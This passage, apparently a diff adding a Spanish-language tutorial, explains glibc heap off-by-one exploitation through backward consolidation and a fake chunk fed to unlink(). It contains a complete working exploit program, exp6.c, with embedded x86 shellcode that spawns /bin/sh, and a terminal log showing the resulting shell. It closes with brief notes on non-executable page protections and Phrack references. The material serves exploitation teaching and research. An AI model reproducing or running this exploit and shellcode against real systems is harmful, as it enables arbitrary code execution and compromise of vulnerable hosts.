+        for(i=0;i<=12;i++) *(p1+i) = argv[1][i];   /* A */
+        strncat(p2, argv[2], 100);		   /* B *
+        free(p2);				   /* C */
+        return (0);
+}
+
+Como podemos observar, en "A" tenemos un heap overflow con el "incoveniente" de 
+que solo podemos sobrescribir el primer byte del segundo chunk. Ademas, el chunk
+que queremos liberar es el segundo, "C", asi pues, como podremos usar el metodo 
+unlink si solo podemos modificar el byte menos significativo del elemento size? 
+La respuesta esta, de nuevo, en la funcion free().
+
+Como vimos anteriormente la funcion free intentara fusionar al chunk que 
+queremos liberar, los chunks previo y siguiente en caso de estar libres. 
+
+En el ejemplo 0x5, free fusionaba el chunk siguiente, foreward consolidation, 
+pero en este, se fusionara el chunk previo y por tanto se usara backward 
+consolidation:
+
+/* consolidate backward */
+      if (!prev_inuse(p)) {
+        prevsize = p->prev_size;
+        size += prevsize;
+        p = chunk_at_offset(p, -((long) prevsize));
+        unlink(p, bck, fwd);
+      }
+
+Una forma posible de explotacion seria crear una falsa cabecera en algun lugar 
+del segundo chunk, introducida  en "B", y hacer creer a free que el chunk previo
+comienza en ese fake chunk en vez de en el primero.
+
+Para engañar a free tendremos que usar otro "truco", free chequeara el campo 
+size del segundo chunk para ver si el flag PREV_INUSE esta activado, esta flag 
+esta en los bits menos significativos del size de modo que podremos modificarlo.
+
+Una vez que free piense que el chunk previo esta libre, buscara su comienzo 
+ayudandose del campo prev_size, si lo modificamos para que apunte al fake chunk 
+(el numero ha de ser negativo asi solo podemos saltar al segundo chunk) free 
+usara unlink sobre esta falsa construccion premitiendonos, de nuevo, escribir 4 
+bytes en cualquier parte de la memoria.
+
+A este tipo de situaciones en las que solo se puede sobrescribir un byte se 
+denomina heap off-by-one, haciendo referencia al conocido metodo off-by-one del 
+stack (frame pointer overwriting).
+
+Vamos a ver un exploit valido.
+
+/*
+ * exp6.c
+ */
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#define SHELLCODEADDR 0x08049688
+#define RETADDR 0xbfffffff
+#define PROG "./ex6"
+
+#define BSIZE 0x64
+
+char shellcode[] =
+/* saltar 10 bytes */
+"\xeb\x0asaltasalta"
+/* shellcode 25 bytes */
+"\x31\xdb\x31\xc9\xf7\xe3\xb0\x46\xcd\x80\x53\x68\x6e"
+"\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89"
+"\xe1\xb0\x0b\xcd\x80";
+
+int
+main(int argc, char **argv)
+{
+        char badbuf[17];
+        char sc[BSIZE];
+        int offset = SHELLCODEADDR, ret = RETADDR;
+
+        if (argc>1)
+                offset+=atoi(argv[1]);
+        if (argc>2)
+                ret -= atoi(argv[2]);
+
+        printf("Shellcode addr[0x%x]\n", offset);
+        printf("Shellcode size[%d]\n", strlen(shellcode));
+        printf("Ret addr [0x%x]\n", ret);
+
+        /* rellenar primer chunk */
+        *(int*)&badbuf[0] = 0x41414141; /* relleno */
+        *(int*)&badbuf[4] = 0x41414141; /* relleno */
+        *(int*)&badbuf[8] = 0xfffffff0; /* prev_size => apunta a fake chunk en sc */
+        *(int*)&badbuf[12] = 0x68; /* size del segundo chunk, flag PREV_INUSE a 0 */
+        badbuf[13] = '\0';
+
+        /* rellenar segundo chunk */
+        memset(sc, 0x00, BSIZE);
+        memset(sc, 'A', 8);
+                /* fake chunk */
+        *(int*)&sc[8] = 0xfffffffe;     /* fake prev_size */
+        *(int*)&sc[12] = 0xffffffff;    /* fake size */
+        *(int*)&sc[16] = ret - 12;      /* direccion ret */
+        *(int*)&sc[20] = offset;
+        *(int*)&sc[24] = 0x90909090;	/* unos cuantos nops */
+        *(int*)&sc[28] = 0x90909090;
+        memcpy(sc+32, shellcode, strlen(shellcode));
+        sc[strlen(sc)+1] = '\0';
+
+        execl(PROG, PROG, badbuf, sc, NULL);
+        return (0);
+}
+
+El elemento prev_size ocupara los ultimos 4 bytes del primer chunk, su nuevo 
+valor apunta a nuestra fake chunk.
+
+En badbuf[12] introducimos el byte que vamos a sobrescribir en el segundo chunk,
+su valor inicial con el flag PREV_INUSE desactivado.
+
+El puntero fd del fake chunk apunta a la direccion de retorno de main, y bk 
+contiene la direccion de una shellcode, situada mas o menos a la mitad del
+segundo chunk.
+
+Vamos a ver si funciona, probamos varios offsets hasta dar con uno que apunte a 
+ret.
+
+
+aragorn:~$ ./exp6 32 1362
+offset [1362]
+Shellcode addr[0x80496a8]
+Shellcode size[43]
+Ret addr [0xbffffaad]
+Segmentation fault (core dumped)
+
+aragorn:~$ ./exp6 32 1363
+offset [1363]
+Shellcode addr[0x80496a8]
+Shellcode size[43]
+Ret addr [0xbffffaac]
+sh-2.05a$
+
+parece que funciona
+
+
+
+5. Protecciones
+
+La forma mas comun de evitar la ejecucion de codigo arbitrario en las regiones
+de datos y pila consiste en la implementacion de paginas no ejecutables.
+Actualmente existen varios parches que usan esta tecnica, como openwall o pax.
+
+
+
+6. Referencias
+
+[1] Once upon a free()
+    http://www.phrack.org/show.php?p=57&a=8
+[2] Vudo - An object superstitiously believed to embody magical powers
+    http://www.phrack.org/show.php?p=57&a=9
+
+
+Para comentarios, dudas, errores y demas historias podeis escribirme a 
+pluf@mail.ru
+
+
+*EOF*
